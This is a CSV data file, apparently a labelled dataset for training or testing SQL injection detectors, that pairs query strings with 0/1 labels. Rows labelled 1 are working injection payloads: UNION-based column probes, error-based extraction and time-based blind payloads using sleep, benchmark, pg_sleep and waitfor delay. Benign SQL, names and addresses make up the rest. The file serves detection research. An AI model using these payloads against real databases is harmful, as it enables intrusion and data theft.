Query,Label
rollie,0
mieres,0
"1""   )    )    and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (   ""qycx"" like ""qycx",1
UEf,1
"1   )    )    union all select null,null,null,null,null,null,null,null,null#",1
SELECT COUNT ( central ) FROM composed,0
"c/ echegaray s/n,",0
SELECT scared ( s )  FROM power,0
1%' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ',1
SELECT taught ( s )  FROM did SELECT clock ( s ) ,0
1 where 3735  =  3735,1
SELECT * FROM practical FETCH FIRST 50 PERCENT ROWS ONLY,0
dellinge,0
valladolid,0
matie,0
"  SELECT DATEDIFF ( ""2017-01-01"",   ""2016-12-24"" ) ;",0
71648159p,0
"rua bamio, 190 11?h",0
 UPDATE cat SET brave = 'minerals'WHERE stiff = 'diameter',0
"0"" encoding  =  ""utf-8"" ?>   <_filter>  <![CDATA[insert]]>  </_filter>   <_filter>  <![CDATA[signup]]>  </_filter>   <_filter>  <![CDATA[widget_login]]>  </_filter>   <a href  =  ""http://caritaskinshasa",0
diccico_pastor@ao09.io,0
SELECT * FROM afraid FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM corner,0
 UPDATE known SET weight = 'slabs'WHERE front = 'image',0
SELECT * FROM dress WHERE memory NOT BETWEEN 'knowledge' AND 'broke',0
saetero farrer,0
"c/ animas, 101,",0
1' and non_existant_table   =   '1,1
SELECT * FROM sugar WHERE send NOT BETWEEN 'everybody' AND 'not',0
begin dbms_lock.sleep  (  5  ) ,1
SELECT TOP 3 * FROM copy WHERE out = 'cheese',0
yuncos,0
31252,0
estiradamente,0
SELECT early ( s )  FROM population UNION ALL,0
SELECT * FROM addition WHERE tonight BETWEEN '1996-07-01' AND '1996-07-31',0
"  UPDATE species SET frog =  'safe', City =  'movie' WHERE flower =  scientist",0
1  )   where 7050  =  7050,1
SELECT * FROM pool FETCH FIRST 3 ROWS ONLY,0
melque de cercos,0
artica,0
"1""   )    )    as lfte where 3811  =  3811 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
-6298' or 4724  =  4876,1
1984,0
"INSERT INTO base ( wind, view, eat, characteristic, fell, familiar )  VALUES  ( 'careful', 'struck'. sick', 'circus', 'star', 'amount', 'separate' )  ",0
fogars de la selva,0
ilya,0
"SELECT * FROM edge WHERE silver BETWEEN ""heard"" AND    ""tube""",0
"iif  (  6369  =  5881,1,1/0  )  ",1
"   SELECT Employees.pound, COUNT ( Orders.carryID )  AS produceFROM    ( OrdersINNER JOIN whatever ON Orders.hurtID  =  Employees.asID ) ",0
"1'  )   and make_set  (  8403  =  8403,8899  )  ",1
SELECT MIN ( sunlight )  AS region FROM four,0
"1'   )    )    and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
55265136t,0
 or ''^',1
SELECT * FROM swim  WHERE original = job,0
1' where 9602  =  9602,1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual  )  +'",1
SELECT DISTINCT baby FROM tin,0
1%'   )    )     )   and 7533  =  7533 and    (    (     (  '%'  =  ',1
SELECT * FROM trace WHERE cutting NOT LIKE 'beyond%',0
"1%'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  '%'  =  '",1
"1,  (  select   (  case when   (  8382  =  8382  )   then 1 else 1/  (  select 0  )   end   )    )   ",1
07485924e,0
SELECT * FROM arrangement FETCH FIRST 50 PERCENT ROWS ONLY,0
9.55315E+15,0
"SELECT * FROM fruit WHERE winter BETWEEN ""shoot"" AND    ""tape""",0
espaldilla,0
"  SELECT * FROM pressure WHERE cowboy NOT IN  ( 'apple', 'remain', 'month' )  ",0
"1""   )    )     )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  ""eoab"" like ""eoab",1
SELECT period ( s )  FROM allow FULL OUTER JOIN,0
kaneko,0
ado,0
SELECT * FROM love FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM tired,0
cendejas de la torre,0
" end and    (    (   ""%""  =  """,1
"calle vereda del carmen, 160 11-e",0
-1587'  )   or 8339  =  5540,1
"  UPDATE sale SET jar =  'shorter', City =  'chain' WHERE occur =  ordinary",0
38470,0
SELECT * FROM positive,0
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'raus'  =  'raus",1
a0_idia,0
"carretera nacional 139, 9?a",0
SELECT * FROM morning FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM  ( SELECT natural FROM run ) ,0
SELECT DATABASE (  ) ;,0
d308ada,0
8.99091E+15,0
SELECT COUNT ( damageID ) FROM foreign,0
09831514a,0
-3613%'  )   or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  '%'  =  ',1
SELECT tower ( s )  FROM sometime UNION,0
SELECT * FROM read 3 SELECT * FROM because,0
"SELECT * FROM struggle WHERE himself BETWEEN ""sound"" AND    ""pass""",0
or sleep  (  __TIME__  )  #,1
"1',  (  select   (  case when   (  5777  =  5777  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
26586,0
SELECT COUNT ( DISTINCT light )  FROM weigh,0
"   SELECT understanding, seldom+ ', ' + dull+ ' ' + route+ ', ' + fully AS ill  FROM nine",0
SELECT * FROM earth WHERE mysterious NOT BETWEEN 'done' AND 'donkey',0
"1' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'eimq'  =  'eimq",1
SELECT TOP 50 PERCENT * FROM couple SELECT * FROM use FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM instance,0
22390,0
"1'+  (  select niht where 7294  =  7294 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
"-3873%'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
70243797a,0
"1' union all select null,null,null#",1
"   SELECT sent,join,enjoy,putting,vast     (  (  average JOIN extra ON visit.good =  dust.higher )   INNER JOIN shownON Orders.till =  example.steadyID ) ",0
"SELECT * FROM negative WHERE vegetable BETWEEN ""cookies"" AND    ""needed""",0
"1  )   or elt  (  6272  =  6272,sleep  (  5   )    )   ",1
"-7324  )   or make_set  (  8486  =  6544,6544  )  ",1
tunaroza capmany,0
-3978 or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  -- mtun,1
8.40007E+15,0
SELECT TOP 50 PERCENT * FROM floor SELECT * FROM sort FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM snake,0
SELECT went ( s FROM hidden RIGHT JOIN,0
SELECT * FROM son FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM grandmother WHERE during LIKE '%blind%',0
select   (  case when   (  7169  =  7785  )   then 1 else 7169*  (  select 7169 from master..sysdatabases  )   end  )  --,1
schweiger_blanc@restaurantepicopico.rw,0
"  SELECT coffee AS sun, coast AS [already]  FROM ruler",0
"1'   )    )    union all select null,null,null,null,null,null,null,null,null--",1
"  SELECT after,instance FROM cheese WHERE wise = 'wall' UNION SELECT consonant, cave FROM plane",0
19197,0
"-7139""  )   where 2723  =  2723 or 3900  =  5082--",1
SELECT apart,0
SELECT AVG ( next ) FROM both SELECT SUM ( vertical ) ,0
SELECT tax FROM missing,0
"  (  updatexml  (  8862,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  8862  =  8862,1   )    )     )  ,0x717a767a71  )  ,8981   )    )   ",1
3440,0
bourne_sereys8@demasiado.com.ye,0
SELECT adjective ( s )  FROM short,0
SELECT * FROM gather WHERE scared NOT LIKE 'cap%',0
"select count  (  *  )   from generate_series  (  1,5000000  )  # fnck",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and ""ulfr"" like ""ulfr",1
.lapidosa,0
"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",1
1' where 2183  =  2183,1
21292,0
73488403e,0
SELECT MIN ( information )  AS fear FROM society,0
"1"" or sleep  (  5  )   and ""telb""  =  ""telb",1
SELECT AVG ( long ) FROM danger SELECT SUM ( safe ) ,0
"1'||  (  select 'ersu' where 4123  =  4123 and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
DELETE FROM frighten WHERE ordinary = 'fine',0
"1%""   )    )    or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (   ""%""  =  """,1
"1   )    )    as qgok where 3993  =  3993 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",1
"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1
"-8487'  )   where 9655  =  9655 union all select 9655,9655,9655,9655,9655,9655,9655,9655,9655,9655--",1
SELECT shade ( s )  FROM yard,0
38847166m,0
"  UPDATE Customers  SET ContactName  =  'Alfred Schmidt', City =  'Frankfurt' WHERE CustomerID  =  1;",0
"1%'   )    )     )   and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (     (  '%'  =  '",1
SELECT COUNT ( favorite )  FROM thirty,0
SELECT COUNT ( we ) FROM balance,0
SELECT * FROM  ( SELECT cost FROM battle ) ,0
5.56439E+15,0
"-4182   )    )    as wkfh where 6145  =  6145 union all select 6145,6145,6145,6145,6145#",1
SELECT COUNT ( ourselves ) FROM saw,0
"   SELECT COUNT ( chamber ) , stock FROM know BY congress",0
SELECT AVG ( flower ) FROM five SELECT SUM ( direction ) ,0
"1""   )    )    and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   ""kldp"" like ""kldp",1
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",1
"INSERT INTO remain ( disappear, drawn, bite, number, rough, please )  VALUES  ( 'fifteen', 'dance'. seed', 'lack', 'period', 'ten', 'task' )  ",0
"1"" and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""sckh""  =  ""sckh",1
lafayette@vitalhome.hk,0
"1'   )    )     )   or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   'bdsq' like 'bdsq",1
"1'||  (  select 'fqoz' where 9794  =  9794 union all select null,null,null,null,null--",1
SELECT * FROM bridge FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM disease,0
fuentiduea,0
"  SELECT * FROM living WHERE carbon NOT IN  ( 'regular', 'wind', 'was' )  ",0
SELECT TOP 3 * FROM strength SELECT * FROM mathematics 3SELECT * FROM gulf,0
SELECT AVG ( army ) FROM build SELECT SUM ( running ) ,0
SELECT COUNT ( jarID ) FROM teeth,0
SELECT * FROM  ( SELECT either FROM parallel ) ,0
"-1710""   )    )    as cvky where 1858  =  1858 union all select 1858,1858--",1
7.13887E+14,0
"1' where 2202  =  2202 and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
SELECT * FROM night WHERE soldier = 'past' FETCH FIRST 3 ROWS ONLY,0
SELECT COUNT ( DISTINCT park )  FROM someone,0
"1  )   or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM setting WHERE hearing BETWEEN angry09/01/1996pay AND such15/31/1996cold,0
-5229'   )    )    as tkqp where 9253  =  9253 or 9323  =  9323#,1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  'ldqq'  =  'ldqq",1
"1""   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   ""ghdr"" like ""ghdr",1
"1'  )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and   (  'xjvr'  =  'xjvr",1
SELECT select ( s )  FROM instead SELECT occur ( s ) ,0
1   )    )    as xyuy where 6894  =  6894,1
29500,0
SELECT * FROM farther WHERE NOT determine = 'began'  AND NOT sink = 'fully',0
"1%""   )    )    rlike sleep  (  5  )  #",1
yudin,0
 UPDATE visit SET differ = 'wash'WHERE drive = 'goes',0
SELECT run ( s )  FROM moment UNION,0
"1%""  )   and 8626  =  3626#",1
"  SELECT saddleID AS ID, shelter AS shade FROM order",0
SELECT recall ( s )  FROM near SELECT yard ( s ) ,0
"1'||  (  select 'pnsw' where 2103  =  2103 union all select null,null,null,null,null,null,null,null--",1
"-4176'+  (  select 'muio' where 4256  =  4256 union all select 4256,4256,4256,4256,4256,4256#",1
SELECT COUNT ( judge )  FROM camp,0
SELECT AVG ( Price ) FROM compare,0
"INSERT INTO specific  ( did, simplest, happily )  VALUES  ( 'great', 'left', 'above' )  ",0
swaden,0
or 1  =  1 /*,1
"1""   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""pmmr""  =  ""pmmr",1
96399738e,0
"1  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-6017 union all select 8449,8449,8449--",1
SELECT COUNT ( especiallyID ) FROM mud,0
1%'  )   and 9226  =  7542--,1
7.77111E+15,0
50408,0
SELECT AVG ( cold )  FROM push  SELECT SUM ( price ) ,0
"calle brasilia, 68,",0
1'   )    )    as qovd where 8865  =  8865 and   (  3020  =  3020  )  *6703--,1
"-5420'  )   union all select 2508,2508,2508,2508,2508,2508,2508#",1
ninn,0
1' where 9816  =  9816 and 7533  =  7533--,1
select pg_sleep  (  5  )   and    (    (     (  'qslr'  =  'qslr,1
"1'   )    )    union all select null,null,null,null,null,null,null,null,null#",1
SELECT poetry,0
9448,0
"  UPDATE bark SET few =  'vapor', City =  'subject' WHERE alphabet =  pretty",0
"1  )   as qodq where 4945  =  4945 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT AVG ( cent )  FROM slipped  SELECT SUM ( mind ) ,0
5h5c8,0
"c/ el jacinto, 132,",0
SELECT * FROM something WHERE    NOT parallel = 'deer',0
7.98317E+15,0
sertino,0
" select * from users where id  =  1 or \+<\ union select 1,@@VERSION -- 1",1
cardiel de los montes,0
1'  )   as zdhq where 5586  =  5586,1
"1""  )   as vdim where 1296  =  1296",1
l-9rn,0
SELECT * FROM smooth WHERE entirely BETWEEN wherever09/01/1996damage AND mother15/31/1996remove,0
"1%""   )    )     )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  ""%""  =  """,1
SELECT * FROM surrounded WHERE send = 'brush' FETCH FIRST 3 ROWS ONLY,0
SELECT AVG ( floor ) FROM safe SELECT SUM ( desk ) ,0
SELECT allow ( s )  FROM exciting SELECT flew ( s ) ,0
SELECT AVG ( cotton ) FROM mother,0
SELECT * FROM hung WHERE that = 'immediately'  OR find = 'search',0
"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
SELECT * FROM meal WHERE brick = 'course'  OR island = 'feature',0
SELECT * FROM done WHERE explore = 'shine' LIMIT 3,0
SELECT * FROM cost WHERE sunlight = 'bread' FETCH FIRST 3 ROWS ONLY,0
"1"" where 2403  =  2403 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1
8.12979E+15,0
"1'   )    )     )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'zfrs'  =  'zfrs",1
"  SELECT * FROM mice WHERE buy IN  ( 'musical', 'tobacco', 'spent' )  ",0
pozal de gallinas,0
SELECT TOP 3 * FROM spider WHERE hunt = 'high',0
SELECT CURTIME (  )  + 1;,0
SELECT * FROM telephone,0
indocto,0
"1' union all select null,null,null,null,null,null,null,null,null,null#",1
SELECT * FROM burn WHERE race BETWEEN voyage09/01/1996paid AND secret15/31/1996goes,0
ten.tar,0
4ode5ista,0
"  SELECT Orders.easierrID, Employees.organized, Employees.general FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.courtID ORDER BY Orders.soonID",0
olivio,0
rascel-byatt@discotecateatre.ug,0
"iif  (  3447  =  1084,1,1/0  )  ",1
greg,0
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1
arrafiz,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 6053 )  ORDER BY meta_id ASC",0
SELECT COUNT ( natural ) FROM something,0
"  SELECT * FROM teach WHERE atomic NOT IN  ( 'beginning', 'press', 'bag' )  ",0
SELECT TOP 50 PERCENT * FROM cross,0
SELECT DATE ( OrderDate )  FROM Orders;,0
de2ape91ibi1ie4to,0
philips@davidymamen.sa,0
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_custom_fields_update' LIMIT 1,0
SELECT * FROM most,0
narbo_nesa,0
SELECT AVG ( pour ) FROM choose SELECT SUM ( within ) ,0
SELECT AVG ( rain ) FROM slipped,0
jones_callas1@copiar.com.travel,0
"c/ altamira 179,",0
47gent1r,0
"1""  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  ""zbwn"" like ""zbwn",1
torre-pacheco,0
"1""  )   where 7010  =  7010 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
1   )    )    as bvij where 7913  =  7913,1
SELECT option_value FROM wp_options WHERE option_name  =  '_transient_wp_stateless_google_sdk_conflict' LIMIT 1,0
" select * from users where id  =  1 or ""?#"" or 1  =  1 -- 1",1
"1%""   )    )     )   union all select null,null,null,null,null,null,null,null--",1
"-5748' union all select 1224,1224,1224,1224,1224,1224,1224,1224,1224#",1
"select * from generate_series  (  1134,1134,case when   (  1134  =  4909  )   then 1 else 0 end  )   limit 1--",1
"1  )   as obhj where 1789  =  1789 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
SELECT * FROM  ( SELECT replied FROM straight ) ,0
43511,0
8449,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (     (  1105  =  1105",1
"   SELECT even, bus+ ', ' + shoulder+ ' ' + flew+ ', ' + there AS oil  FROM flight",0
SELECT * FROM human WHERE shall BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COT ( 6 ) ;,0
-6661'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'tbmu' like 'tbmu,1
servitje areggiani,0
SELECT TOP 50 PERCENT * FROM our,0
1' where 8635  =  8635 order by 1--,1
SELECT * FROM film WHERE Price NOT BETWEEN 10 AND 20,0
maragliano serna,0
"   SELECT salt, lunch, atmosphereFROM bag WHERE yourself  IS NOT NULL",0
*ayustar,0
manzanilla,0
nancy,0
6.90524E+15,0
SELECT * FROM with WHERE depth = 'wore'  OR feel = 'red',0
1  )   as hggi where 6511  =  6511,1
"calle arfian 36,",0
16802646l,0
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'bmhw' like 'bmhw,1
SELECT TOP 50 PERCENT * FROM nodded,0
SELECT MIN ( buried )  AS clothing FROM call,0
"-8491"" where 9043  =  9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",1
c/ linajes 178 9?f,0
"   SELECT Employees.fun, COUNT ( Orders.ruleID )  AS anyoneFROM    ( OrdersINNER JOIN pot ON Orders.coolID  =  Employees.beautyID ) ",0
"1""  )   where 7919  =  7919 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
5659,0
bradshaw.ocallaghan@almascanarias.do,0
1750,0
"1'||  (  select 'xbvz' from dual where 1632  =  1632 union all select null,null,null,null,null,null,null,null--",1
SELECT TOP 3 * FROM organized,0
"1' in boolean mode  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  #",1
"1%""  )   and   (  3020  =  3020  )  *6703 and   (  ""%""  =  """,1
"-2006'   )    )    union all select 7852,7852,7852,7852,7852--",1
1%' and   (  3020  =  3020  )  *6703 and '%'  =  ',1
"1""  )   as nfpe where 2679  =  2679",1
74725623a,0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'xlvt'  =  'xlvt",1
1 where 1015  =  1015,1
"  SELECT DAYOFMONTH ( ""2017-06-15"" ) ;",0
SELECT * FROM enter FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM situation,0
SELECT * FROM park WHERE tried  BETWEEN 10 AND 20,0
SELECT TOP 50 PERCENT * FROM position,0
SELECT * FROM  ( SELECT soap FROM exactly ) ,0
"  UPDATE putting SET charge =  'went', City =  'dozen' WHERE signal =  rate",0
"  SELECT * FROM mail WHERE human NOT IN  ( 'particles', 'porch', 'colony' )  ",0
SELECT COUNT ( nearly ) FROM range,0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  ""%""  =  """,1
-2307'   )    )     )   or 6872  =  6872 and    (    (     (  'fyok' like 'fyok,1
"1' or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   ",1
40560,0
"-8546' union all select 4729,4729,4729,4729,4729,4729,4729,4729,4729#",1
"-9384%"" union all select 7031,7031,7031,7031,7031,7031,7031,7031,7031#",1
"select count  (  *  )   from generate_series  (  1,5000000  )  ",1
1%'   )    )     )   and 3916  =  6327--,1
47965007w,0
torralba del ro,0
25559456q,0
1 where 5161  =  5161 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --,1
teruyuki,0
SELECT SYSTEM_USER (  ) ;,0
1'  )   where 6842  =  6842,1
"INSERT INTO highway  ( cheese, age, pale )  VALUES  ( 'gun', 'mix', 'fast' )  ",0
"   SELECT clock,bare,fruit,mile,tree     (  (  bottom JOIN hurried ON planning.state =  society.chair )   INNER JOIN weON Orders.bar =  child.sheepID ) ",0
SELECT shelf ( s )  FROM kill,0
1'  )   as xbsc where 6772  =  6772,1
SELECT MIN ( damage )  AS won FROM sea,0
dick,0
"1""  )   where 2764  =  2764 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --",1
"1""   )    )     )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
DELETE FROM dangerous WHERE strike = 'picture',0
SELECT * FROM exciting FETCH FIRST 50 PERCENT ROWS ONLY,0
"   SELECT them, control+ ', ' + slabs+ ' ' + upward+ ', ' + chosen AS name  FROM everything",0
"INSERT INTO die ( smallest, rice, measure, these, truth, distance )  VALUES  ( 'court', 'live'. five', 'boy', 'package', 'determine', 'seven' )  ",0
"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
lyden@.mv,0
"1'   )    )    as xebq where 7959  =  7959 union all select null,null,null,null,null,null#",1
latimer@puntodevistafotografia.ve,0
"-4705' where 2029  =  2029 union all select 2029,2029,2029#",1
7.90589E+15,0
"1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'lokx' like 'lokx",1
SELECT AVG ( particular ) FROM group SELECT SUM ( wonderful ) ,0
end and   (  'nchh'  =  'nchh,1
"INSERT INTO party ( effect, share, system, wet, east, blood )  VALUES  ( 'eaten', 'canal'. wood', 'agree', 'dirty', 'tent', 'drink' )  ",0
1'+  (  select 'ggkm' where 3394  =  3394,1
1' in boolean mode  )   waitfor delay '0:0:5'#,1
15318,0
aitor,0
SELECT * FROM known WHERE layers = 'opinion'  OR arrange = 'fed',0
